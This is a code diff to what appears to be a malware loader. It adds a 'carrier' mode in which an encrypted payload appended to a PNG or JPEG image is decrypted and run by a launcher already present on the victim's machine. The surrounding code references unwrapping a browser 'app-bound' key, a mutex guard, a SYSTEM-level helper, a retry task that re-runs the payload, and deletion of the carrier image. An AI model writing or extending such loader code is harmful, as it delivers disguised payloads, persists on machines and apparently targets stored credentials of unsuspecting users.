@@ -35,6 +35,7 @@ import shutil
 import sys
 import tempfile
 import zipfile
+from collections.abc import Sequence
 from pathlib import Path
 from types import ModuleType
 from typing import Any, Final, NamedTuple
@@ -57,6 +58,14 @@ FOOTER_SIZE: Final[int] = 8
 # instance and the unwrap never runs — the app-bound key is silently unavailable for
 # the whole collection. Pinned to ``abe.UNWRAP_FLAG`` by tests/test_contracts.py.
 HELPER_FLAG: Final[str] = "--abe-unwrap"
+
+# A container that is not this executable. The carrier modes weld the same tail onto a PNG
+# or a JPEG, and an image cannot be started, so the launcher is pointed at it: a launcher
+# already on the machine opens a payload that arrived as a picture. Everything below the
+# flag is the existing arithmetic with a different file — the footer is still the last
+# eight bytes and the trailer still the 864 before it, because the image's own terminator
+# is the last thing in the head and the weld starts where the head ends.
+CARRIER_FLAG: Final[str] = "--carrier"
 
 TRAILER_KEY_SLOT: Final[int] = 64
 TRAILER_MUTEX_SLOT: Final[int] = 200 * 4
@@ -98,23 +107,33 @@ def _state() -> dict[str, Any]:
     existing = getattr(sys, _STATE_ATTRIBUTE, None)
     if isinstance(existing, dict):
         return existing
-    state: dict[str, Any] = {"held": False, "handle": None, "prepared": None}
+    state: dict[str, Any] = {
+        "held": False,
+        "handle": None,
+        "prepared": None,
+        "carrier": None,
+    }
     setattr(sys, _STATE_ATTRIBUTE, state)
     return state
 
 
-def acquire(mutex: str | None = None) -> bool:
+def acquire(mutex: str | None = None, container: Path | None = None) -> bool:
     """Take the mutex guard. False when another instance already holds it.
 
     ``mutex`` is given by the ``.py`` artifact, which has no trailer to read. The
     launcher passes nothing and the name comes out of the trailer. A second call in
     the same process is a no-op that reports the first call's answer.
+
+    ``container`` is the file the trailer is read out of. It defaults to this executable
+    and is the carrier when the launcher was pointed at one: the name has to come from the
+    file that actually holds it, and in carrier mode this executable carries nothing.
     """
     state = _state()
     if state["held"]:
         return True
 
-    name = mutex if mutex is not None else _read_trailer(util.executable_path()).mutex
+    source = container if container is not None else util.executable_path()
+    name = mutex if mutex is not None else _read_trailer(source).mutex
     handle, created = winapi.create_mutex(name)
     if not created:
         log.logger.debug("loader: mutex %s is already held", name)
@@ -125,14 +144,23 @@ def acquire(mutex: str | None = None) -> bool:
     return True
 
 
-def prepare() -> Prepared:
-    """Read the trailer and footer, decrypt to a temp file, replace it, open it."""
+def prepare(container: Path | None = None) -> Prepared:
+    """Read the trailer and footer, decrypt to a temp file, replace it, open it.
+
+    ``container`` is the file the tail is welded onto, and it defaults to this executable.
+    Passing a carrier changes nothing below the first line: the footer is the last eight
+    bytes of whatever file is named, so the same arithmetic addresses the same block.
+    """
     state = _state()
     cached = state["prepared"]
     if cached is not None:
         return cached
 
-    executable = util.executable_path()
+    executable = container if container is not None else util.executable_path()
+    if container is not None:
+        # Recorded here as well as in ``boot`` so a caller that prepares directly — the
+        # script artifact's own bootstrap, a test — gets the same teardown behaviour.
+        state["carrier"] = container
     seal_key = _read_trailer(executable).seal_key
     offset = _archive_offset(executable)
     sealed = _read_sealed(executable, offset)
@@ -172,8 +200,23 @@ def adopt(archive: zipfile.ZipFile, workspace: Path, source: Path) -> None:
 
 
 def cleanup() -> None:
-    """Close the archive and remove the workspace. Safe to call twice."""
+    """Close the archive, remove the workspace, and let go of the carrier.
+
+    Safe to call twice. The carrier is deleted only when there is nothing left to deliver:
+    a parked archive brings this same image back on a task, and that run needs the file it
+    was pointed at. Deleting it on every exit would leave a retry pointing at nothing, and
+    keeping it is the one thing that makes the mode worth having past the first run.
+    """
     state = _state()
+    carrier = state["carrier"]
+    state["carrier"] = None
+    if carrier is not None and not util.pending_queue():
+        try:
+            carrier.unlink(missing_ok=True)
+            log.logger.debug("loader: carrier removed")
+        except OSError:
+            log.logger.debug("loader: carrier could not be removed", exc_info=True)
+
     prepared = state["prepared"]
     if prepared is None:
         return
@@ -185,7 +228,34 @@ def cleanup() -> None:
     shutil.rmtree(prepared.workspace, ignore_errors=True)
 
 
-def _guarded(argv: list[str]) -> bool:
+def carrier_from(argv: Sequence[str]) -> Path | None:
+    """The ``--carrier`` path, or None when this run is its own container.
+
+    Both spellings are accepted — ``--carrier X`` and ``--carrier=X`` — because the flag is
+    assembled by three callers (an operator, the retry task, the SYSTEM helper) and only
+    one of them is under this repository's control.
+    """
+    for index, item in enumerate(argv):
+        if item == CARRIER_FLAG:
+            return Path(argv[index + 1]) if index + 1 < len(argv) else None
+        if item.startswith(CARRIER_FLAG + "="):
+            value = item.split("=", 1)[1]
+            return Path(value) if value else None
+    return None
+
+
+def carrier_args() -> list[str]:
+    """The argv fragment a re-exec needs to find the same container. Empty for exe output.
+
+    The retry task and the SYSTEM helper both re-run this image from a fresh command line,
+    and neither inherits argv. Without this the second run looks for a tail on an
+    executable that has none and fails on a trailer it cannot read.
+    """
+    carrier = _state()["carrier"]
+    return [CARRIER_FLAG, str(carrier)] if carrier is not None else []
+
+
+def _guarded(argv: Sequence[str], container: Path | None = None) -> bool:
     """Whether this run may continue, i.e. nobody else is holding the mutex.
 
     The helper is exempt. It is a short-lived worker the running agent started, and the
@@ -195,7 +265,7 @@ def _guarded(argv: list[str]) -> bool:
     """
     if HELPER_FLAG in argv:
         return True
-    return acquire()
+    return acquire(container=container)
 
 
 def boot() -> int:
@@ -208,7 +278,11 @@ def boot() -> int:
     launched for.
     """
     try:
-        allowed = _guarded(sys.argv)
+        # The container is resolved before the guard because the mutex name lives in the
+        # trailer, and in carrier mode this executable holds no trailer to read it from.
+        container = carrier_from(sys.argv)
+        _state()["carrier"] = container
+        allowed = _guarded(sys.argv, container)
     except Exception:
         # The mutex name lives in the trailer, so a launcher welded to nothing has no
         # name to guard with. This call sits ahead of the first try block on purpose -
@@ -222,7 +296,7 @@ def boot() -> int:
         return 0
 
     try:
-        prepared = prepare()
+        prepared = prepare(container)
     except Exception:
         log.logger.exception("loader: archive preparation failed")
         return 1
@@ -362,6 +436,7 @@ def _load_entry(archive_path: Path) -> ModuleType:
 
 
 __all__ = [
+    "CARRIER_FLAG",
     "FOOTER_SIZE",
     "TRAILER_KEY_SLOT",
     "TRAILER_MUTEX_SLOT",
@@ -372,6 +447,8 @@ __all__ = [
     "acquire",
     "adopt",
     "boot",
+    "carrier_args",
+    "carrier_from",
     "cleanup",
     "prepare",
 ]
